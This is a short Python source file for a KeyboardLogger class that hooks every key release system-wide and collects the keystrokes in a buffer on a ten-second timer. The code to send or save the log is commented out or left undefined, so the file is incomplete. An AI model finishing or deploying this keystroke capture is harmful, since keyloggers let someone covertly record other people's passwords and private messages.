import keyboard
from threading import Timer
from datetime import datetime
import time

class KeyboardLogger():
    def __init__(self, interval, report_method='file'):
        self.interval = interval
        self.report_method = report_method
        self.log = ''
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
    
    def callback(self,event):
        name = event.name
        if(len(name)>1):
            #def missed some here, ctrl for example
            if name == 'space':
                name = ' '
            elif name == 'enter':
                name = '[ENTER]\n'
            elif name=='decimal':
                name = '.'
            else:
                name = name.replace(" ","_")
                name = f"[{name.upper()}]"
        self.log += name

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            #self.send_log_to_app()
            self.start_dt = datetime.now()
            
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
        self.log = ''
   
       # should be using this method
    def report_to_app(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_kb_log()
            self.log = ''

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        if self.report_method=='app':
            time.sleep(.5) 
        
        elif self.report_method=='file':
            keyboard.wait()
    
    def stop(self):
        keyboard.unhook_all()

if __name__=='__main__':
    KL = KeyboardLogger(interval=10)
    KL.start()
